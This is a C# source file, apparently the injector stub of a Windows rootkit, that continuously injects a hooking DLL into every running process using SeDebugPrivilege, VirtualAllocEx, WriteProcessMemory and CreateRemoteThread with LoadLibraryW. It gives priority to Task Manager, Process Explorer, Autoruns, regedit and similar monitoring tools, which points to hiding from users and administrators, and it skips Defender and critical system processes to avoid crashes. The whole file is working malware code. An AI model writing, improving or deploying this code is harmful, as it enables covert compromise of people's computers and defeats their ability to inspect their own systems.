using System.Runtime.InteropServices;
using System.Text;

namespace SeroStub;

/// <summary>
/// Continuously injects the rootkit DLL into all running processes
/// using CreateRemoteThread + LoadLibraryW so Detours hooks apply everywhere.
/// Uses only P/Invoke (no System.Diagnostics.Process) for NativeAOT compatibility.
/// </summary>
internal static partial class Injector
{
    // ---- Toolhelp32 snapshot ----
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private unsafe struct PROCESSENTRY32W
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public nint th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        public fixed char szExeFile[260];
    }

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool Process32FirstW(nint hSnapshot, ref PROCESSENTRY32W lppe);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool Process32NextW(nint hSnapshot, ref PROCESSENTRY32W lppe);

    // ---- Process manipulation ----
    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint VirtualAllocEx(nint hProcess, nint lpAddress, nuint dwSize, uint flAllocationType, uint flProtect);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool VirtualFreeEx(nint hProcess, nint lpAddress, nuint dwSize, uint dwFreeType);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool WriteProcessMemory(nint hProcess, nint lpBaseAddress, byte[] lpBuffer, nuint nSize, out nuint lpNumberOfBytesWritten);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint CreateRemoteThread(nint hProcess, nint lpThreadAttributes, nuint dwStackSize, nint lpStartAddress, nint lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GetExitCodeProcess(nint hProcess, out uint lpExitCode);

    [LibraryImport("kernel32.dll")]
    private static partial nint GetModuleHandleW([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf8)]
    private static partial nint GetProcAddress(nint hModule, string lpProcName);

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool CloseHandle(nint hObject);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial uint WaitForSingleObject(nint hHandle, uint dwMilliseconds);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool IsWow64Process(nint hProcess, [MarshalAs(UnmanagedType.Bool)] out bool wow64Process);

    [LibraryImport("kernel32.dll")]
    private static partial uint GetCurrentProcessId();

    // ---- Privilege escalation ----
    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool OpenProcessToken(nint ProcessHandle, uint DesiredAccess, out nint TokenHandle);

    [LibraryImport("advapi32.dll", SetLastError = true, StringMarshalling = StringMarshalling.Utf16)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool LookupPrivilegeValueW(string? lpSystemName, string lpName, out long lpLuid);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AdjustTokenPrivileges(nint TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, nint PreviousState, nint ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY             = 0x0008;
    const uint SE_PRIVILEGE_ENABLED    = 0x00000002;
    const uint STILL_ACTIVE            = 259;

    private static void EnableDebugPrivilege()
    {
        if (!OpenProcessToken((nint)(-1), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out nint token))
            return;
        if (LookupPrivilegeValueW(null, "SeDebugPrivilege", out long luid))
        {
            var tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
            AdjustTokenPrivileges(token, false, ref tp, 0, 0, 0);
        }
        CloseHandle(token);
    }

    const uint TH32CS_SNAPPROCESS    = 0x00000002;
    const uint PROCESS_CREATE_THREAD  = 0x0002;
    const uint PROCESS_VM_OPERATION   = 0x0008;
    const uint PROCESS_VM_WRITE       = 0x0020;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint INJECT_ACCESS = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
    const uint MEM_COMMIT   = 0x1000;
    const uint MEM_RESERVE  = 0x2000;
    const uint MEM_RELEASE  = 0x8000;
    const uint PAGE_READWRITE = 0x04;

    // Processes that must NEVER receive the hook DLL — crashing them causes BSODs,
    // logon failures, black screens, or other system-wide instability.
    private static readonly HashSet<string> _blacklist = new(StringComparer.OrdinalIgnoreCase)
    {
        "csrss.exe",       // Client/Server Runtime Subsystem — crash = BSOD
        "smss.exe",        // Session Manager — crash = BSOD
        "lsass.exe",       // Local Security Authority — crash = forced reboot
        "lsaiso.exe",      // Credential Guard isolation
        "wininit.exe",     // Windows Init
        "winlogon.exe",    // Logon process — crash = logout
        "services.exe",    // Service Control Manager
        "dwm.exe",         // Desktop Window Manager — crash = black screen
        "fontdrvhost.exe", // Font driver host (UMFD)
        "audiodg.exe",     // Audio Device Graph
        "MsMpEng.exe",     // Windows Defender AV engine
        "SgrmBroker.exe",  // System Guard Runtime Monitor
    };

    // PID → true means we already injected into this process instance.
    // Pruned every loop to handle PID reuse (dead processes removed from the set).
    private static readonly HashSet<uint> _injectedPids = new();
    private static string _dllPath   = "";
    private static string _dllPath32 = "";   // x86 DLL for WOW64 processes
    private static nint _loadLibAddr;
    private static volatile bool _running;

    // Known monitoring tools — inject into these immediately on detection
    private static readonly HashSet<string> _priorityTargets = new(StringComparer.OrdinalIgnoreCase)
    {
        "taskmgr.exe", "procexp.exe", "procexp64.exe",
        "tcpview.exe", "Autoruns.exe", "Autoruns64.exe",
        "ProcessHacker.exe", "SystemInformer.exe",
        "regedit.exe", "msconfig.exe",
    };

    public static void Start(string dllPath, string dllPath32 = "")
    {
        if (_running) return;
        _running   = true;
        _dllPath   = dllPath;
        _dllPath32 = dllPath32;

        nint kernel32 = GetModuleHandleW("kernel32.dll");
        _loadLibAddr = GetProcAddress(kernel32, "LoadLibraryW");
        if (_loadLibAddr == 0)
        {
            StubLog.Error("[Injector] GetProcAddress(LoadLibraryW) failed.");
            return;
        }

        var thread = new Thread(InjectionLoop)
        {
            IsBackground = true,
            Priority = ThreadPriority.AboveNormal  // needs to win the race against the monitored process
        };
        thread.Start();
        StubLog.Info("[Injector] Started.");
    }

    public static void Stop()
    {
        _running = false;
        StubLog.Info("[Injector] Stopped.");
    }

    // Dead-process prune counter — only prune every 20 iterations to avoid overhead
    private static int _pruneCounter = 0;

    private static void InjectionLoop()
    {
        uint myPid = GetCurrentProcessId();
        _injectedPids.Add(myPid);
        _injectedPids.Add(0);
        _injectedPids.Add(4); // System

        EnableDebugPrivilege();
        StubLog.Info("[Injector] Debug privilege acquired, entering loop.");

        while (_running)
        {
            try
            {
                if (++_pruneCounter >= 20) { PruneDead(); _pruneCounter = 0; }

                nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap != -1 && snap != 0)
                {
                    var entry = new PROCESSENTRY32W();
                    unsafe { entry.dwSize = (uint)sizeof(PROCESSENTRY32W); }
                    if (Process32FirstW(snap, ref entry))
                    {
                        do
                        {
                            uint pid = entry.th32ProcessID;
                            if (_injectedPids.Contains(pid)) continue;

                            string exeName;
                            unsafe { exeName = new string(entry.szExeFile).TrimEnd('\0'); }
                            if (_blacklist.Contains(exeName)) { _injectedPids.Add(pid); continue; }

                            bool ok = InjectDll(pid, exeName, out string failReason);
                            if (ok)
                            {
                                _injectedPids.Add(pid);
                                StubLog.Info($"[Injector] Injected {exeName} PID={pid}");
                            }
                            else
                            {
                                if (failReason.Contains("GLE=5") || failReason.Contains("GLE=87") ||
                                    failReason.Contains("GLE=1008"))
                                    _injectedPids.Add(pid); // protected process — don't retry
                                else if (!failReason.Contains("x86-skip"))
                                    StubLog.Info($"[Injector] Failed {exeName} PID={pid}: {failReason}");
                            }
                        } while (Process32NextW(snap, ref entry));
                    }
                    CloseHandle(snap);
                }
            }
            catch (Exception ex)
            {
                StubLog.Error($"[Injector] Loop error: {ex.Message}");
            }

            // Fast poll for monitoring tools (150ms), slower for everything else
            // In practice the loop itself takes ~50-100ms so effective rate is ~200-250ms
            Thread.Sleep(150);
        }
    }

    // Remove PIDs whose processes have exited so injection can occur into reused PIDs.
    private static void PruneDead()
    {
        var dead = new List<uint>();
        foreach (uint pid in _injectedPids)
        {
            if (pid <= 4) continue; // never prune system + ourselves
            nint h = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
            if (h == 0) { dead.Add(pid); continue; }
            try
            {
                if (GetExitCodeProcess(h, out uint code) && code != STILL_ACTIVE)
                    dead.Add(pid);
            }
            finally { CloseHandle(h); }
        }
        foreach (uint pid in dead)
            _injectedPids.Remove(pid);
    }

    private static bool InjectDll(uint pid, string exeName, out string failReason)
    {
        if (_loadLibAddr == 0) { failReason = "LoadLibraryW addr=0"; return false; }

        nint hProcess = OpenProcess(INJECT_ACCESS, false, pid);
        if (hProcess == 0) { failReason = $"OpenProcess failed GLE={Marshal.GetLastWin32Error()}"; return false; }

        nint remoteMem = 0;
        try
        {
            IsWow64Process(hProcess, out bool isWow64);

            // For 32-bit (WOW64) processes: use the x86 DLL if available
            string targetDll = isWow64 ? _dllPath32 : _dllPath;
            if (string.IsNullOrEmpty(targetDll))
            {
                // x86 DLL not embedded — skip silently so log stays clean
                failReason = isWow64 ? "x86-skip" : "no DLL path";
                return false;
            }

            byte[] dllBytes = Encoding.Unicode.GetBytes(targetDll + "\0");
            nuint size = (nuint)dllBytes.Length;

            remoteMem = VirtualAllocEx(hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remoteMem == 0) { failReason = $"VirtualAllocEx failed GLE={Marshal.GetLastWin32Error()}"; return false; }

            if (!WriteProcessMemory(hProcess, remoteMem, dllBytes, size, out _))
                { failReason = $"WriteProcessMemory failed GLE={Marshal.GetLastWin32Error()}"; return false; }

            nint hThread = CreateRemoteThread(hProcess, 0, 0, _loadLibAddr, remoteMem, 0, out _);
            if (hThread == 0) { failReason = $"CreateRemoteThread failed GLE={Marshal.GetLastWin32Error()}"; return false; }

            // Priority targets: wait for injection to complete before continuing
            uint waitMs = _priorityTargets.Contains(exeName) ? 5000u : 500u;
            WaitForSingleObject(hThread, waitMs);
            CloseHandle(hThread);
            failReason = "";
            return true;
        }
        finally
        {
            if (remoteMem != 0)
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
        }
    }
}
